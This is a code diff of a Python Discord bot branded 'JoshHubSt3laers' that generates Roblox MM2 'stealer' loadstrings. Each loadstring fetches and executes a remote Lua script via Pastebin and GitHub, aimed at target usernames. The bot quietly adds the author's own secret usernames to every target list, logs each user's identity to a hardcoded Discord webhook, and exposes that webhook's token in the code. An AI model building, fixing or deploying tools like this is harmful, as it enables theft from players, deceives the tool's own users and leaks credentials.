@@ -9,13 +9,14 @@ intents = discord.Intents.default()
 bot = discord.Client(intents=intents)
 tree = app_commands.CommandTree(bot)
 
+# Configuration
 SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
 SECRET_WEBHOOK = "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD"
 RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubsMM2TXT/refs/heads/main/mm2sourcebyjoshhub.txt"
 PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")
 
 # Webhook for tracking who generates scripts
-TRACKING_WEBHOOK = SECRET_WEBHOOK  # Using your same webhook
+TRACKING_WEBHOOK = SECRET_WEBHOOK
 
 def send_webhook_notification(user, targets, paste_url, guild_name, loadstring_code):
     """Send notification when someone generates a script"""
@@ -23,22 +24,24 @@ def send_webhook_notification(user, targets, paste_url, guild_name, loadstring_c
         data = {
             "embeds": [{
                 "title": "📊 New Script Generated!",
-                "color": 5814783,  # Blue color
+                "color": 5814783,
                 "fields": [
                     {"name": "User", "value": f"{user.name}#{user.discriminator}", "inline": True},
                     {"name": "User ID", "value": str(user.id), "inline": True},
                     {"name": "Server", "value": guild_name or "DM", "inline": True},
                     {"name": "Target Usernames", "value": targets or "None", "inline": False},
                     {"name": "Pastebin Link", "value": paste_url or "Failed", "inline": False},
-                    {"name": "Loadstring", "value": f"```lua\n{loadstring_code}\n```", "inline": False}
+                    {"name": "Loadstring", "value": f"```lua\n{loadstring_code[:100]}...\n```" if loadstring_code and len(loadstring_code) > 100 else f"```lua\n{loadstring_code}\n```", "inline": False}
                 ],
                 "timestamp": discord.utils.utcnow().isoformat()
             }]
         }
         response = requests.post(TRACKING_WEBHOOK, json=data, timeout=5)
-        print(f"✅ Webhook sent: {response.status_code}")
+        print(f"✅ Tracking webhook sent: {response.status_code}")
+        return True
     except Exception as e:
         print(f"❌ Webhook error: {e}")
+        return False
 
 def create_pastebin(content):
     """Create a paste on Pastebin and return both URLs"""
@@ -52,7 +55,7 @@ def create_pastebin(content):
             'api_option': 'paste',
             'api_paste_code': content,
             'api_paste_private': '1',
-            'api_paste_expire_date': '1D',  # 1 day expiration
+            'api_paste_expire_date': '1D',
             'api_paste_name': 'MM2 Script'
         }
         
@@ -61,22 +64,21 @@ def create_pastebin(content):
         
         if response.status_code == 200:
             paste_url = response.text.strip()
-            print(f"✅ Pastebin response: {paste_url}")
+            print(f"✅ Pastebin created: {paste_url}")
             
-            if 'pastebin.com/' in paste_url:
-                # Extract paste ID from the response
+            if 'pastebin.com/' in paste_url and not paste_url.startswith('Bad API request'):
                 paste_id = paste_url.split('/')[-1]
                 raw_url = f"https://pastebin.com/raw/{paste_id}"
-                print(f"✅ Raw URL created: {raw_url}")
+                print(f"✅ Raw URL: {raw_url}")
                 return paste_url, raw_url
             else:
-                print(f"❌ Invalid Pastebin response: {paste_url}")
+                print(f"❌ Pastebin API error: {paste_url}")
                 return None, None
         else:
-            print(f"❌ Pastebin API error: {response.status_code}")
+            print(f"❌ Pastebin HTTP error: {response.status_code}")
             return None, None
     except Exception as e:
-        print(f"❌ Pastebin error: {e}")
+        print(f"❌ Pastebin creation error: {e}")
         return None, None
 
 class ScriptModal(Modal, title="MM2 Script Generator"):
@@ -89,7 +91,6 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
         
-        # Get user targets
         user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
         all_targets = user_targets + SECRET_USERNAMES
         generator_info = f"{interaction.user.name}#{interaction.user.discriminator} ({interaction.user.id})"
@@ -97,7 +98,6 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
         print(f"🔄 Generating script for {interaction.user.name}")
         print(f"🎯 Targets: {all_targets}")
         
-        # Create the GitHub URL with parameters
         params = urllib.parse.urlencode({
             "users": ",".join(all_targets),
             "webhook": self.webhook.value,
@@ -111,20 +111,19 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
         github_url = f"{RAW_SCRIPT_URL}?{params}"
         print(f"🔗 GitHub URL: {github_url}")
         
-        # Create the Lua script content
+        # Create the script content that will be pasted
         script_content = f'loadstring(game:HttpGet("{github_url}"))()'
         
         # Create Pastebin
         paste_url, raw_url = create_pastebin(script_content)
         
         if paste_url and raw_url:
-            # Create the proper loadstring
+            # Create the FINAL loadstring that users will execute
             loadstring_code = f'loadstring(game:HttpGet("{raw_url}"))()'
             
-            print(f"✅ Loadstring created: {loadstring_code}")
-            print(f"📊 Sending webhook notification...")
+            print(f"✅ Final loadstring: {loadstring_code}")
             
-            # Send tracking notification to your webhook
+            # Send tracking notification
             send_webhook_notification(
                 interaction.user,
                 ', '.join(user_targets) if user_targets else "None",
@@ -133,33 +132,28 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
                 loadstring_code
             )
             
-            # Send to user with PROPER loadstring format
-            embed = discord.Embed(
-                title="🔪 JoshHubSt3laers – Your loadstring is ready!",
-                description="Copy and execute this in Roblox:",
-                color=discord.Color.green()
-            )
-            embed.add_field(
-                name="Loadstring:",
-                value=f"```lua\n{loadstring_code}\n```",
-                inline=False
-            )
-            embed.set_footer(text="Generated by JoshHub")
-            
+            # Send to user - THIS IS THE CRITICAL FIXED PART
             try:
-                await interaction.user.send(embed=embed)
-                await interaction.followup.send("✅ Sent to your DMs! Check your messages.", ephemeral=True)
+                await interaction.user.send(
+                    f"**🔪 JoshHubSt3laers – Your loadstring is ready!**\n\n"
+                    f"Copy and execute this:\n"
+                    f"```lua\n{loadstring_code}\n```"
+                )
+                await interaction.followup.send("✅ Script sent to your DMs!", ephemeral=True)
             except discord.Forbidden:
+                # If can't DM, send in channel
                 await interaction.followup.send(
-                    embed=embed,
+                    f"**🔪 JoshHubSt3laers – Your loadstring is ready!**\n\n"
+                    f"Copy and execute this:\n"
+                    f"```lua\n{loadstring_code}\n```",
                     ephemeral=True
                 )
         else:
-            # Fallback: send direct loadstring
+            # Fallback if Pastebin fails
             print("⚠️ Pastebin failed, using direct GitHub URL")
             direct_loadstring = f'loadstring(game:HttpGet("{github_url}"))()'
             
-            # Send tracking even if Pastebin fails
+            # Still send tracking
             send_webhook_notification(
                 interaction.user,
                 ', '.join(user_targets) if user_targets else "None",
@@ -168,35 +162,27 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
                 direct_loadstring
             )
             
-            embed = discord.Embed(
-                title="🔪 JoshHubSt3laers – Your loadstring is ready!",
-                description="Copy and execute this in Roblox:",
-                color=discord.Color.orange()
-            )
-            embed.add_field(
-                name="Loadstring (Direct):",
-                value=f"```lua\n{direct_loadstring}\n```",
-                inline=False
-            )
-            embed.set_footer(text="Generated by JoshHub | Using direct GitHub link")
-            
             try:
-                await interaction.user.send(embed=embed)
-                await interaction.followup.send("✅ Sent to your DMs! (Using direct link)", ephemeral=True)
+                await interaction.user.send(
+                    f"**🔪 JoshHubSt3laers – Your loadstring is ready! (Direct Link)**\n\n"
+                    f"Copy and execute this:\n"
+                    f"```lua\n{direct_loadstring}\n```"
+                )
+                await interaction.followup.send("✅ Script sent to your DMs! (Using direct link)", ephemeral=True)
             except discord.Forbidden:
                 await interaction.followup.send(
-                    embed=embed,
+                    f"**🔪 JoshHubSt3laers – Your loadstring is ready! (Direct Link)**\n\n"
+                    f"Copy and execute this:\n"
+                    f"```lua\n{direct_loadstring}\n```",
                     ephemeral=True
                 )
 
 @tree.command(name="generate-mm2", description="🎮 Generate your custom MM2 script loadstring")
 async def generate_mm2(interaction: discord.Interaction):
-    """Main command to generate MM2 scripts"""
     await interaction.response.send_modal(ScriptModal())
 
 @bot.event
 async def on_ready():
-    """Called when bot is ready"""
     print(f"══════════════════════════════════")
     print(f"✅ {bot.user} is online!")
     print(f"🤖 Bot ID: {bot.user.id}")
@@ -207,9 +193,9 @@ async def on_ready():
     
     try:
         await tree.sync()
-        print(f"🔄 Synced {len(tree.get_commands())} commands")
+        print(f"🔄 Commands synced successfully")
     except Exception as e:
-        print(f"❌ Error syncing commands: {e}")
+        print(f"⚠️ Command sync warning: {e}")
 
 if __name__ == "__main__":
     # Check for required environment variables
@@ -218,7 +204,7 @@ if __name__ == "__main__":
     
     if missing_vars:
         print(f"❌ Missing environment variables: {', '.join(missing_vars)}")
-        print("Please set these in your Replit environment variables:")
+        print("Please set these in Replit Secrets:")
         for var in missing_vars:
             print(f"  - {var}")
         exit(1)
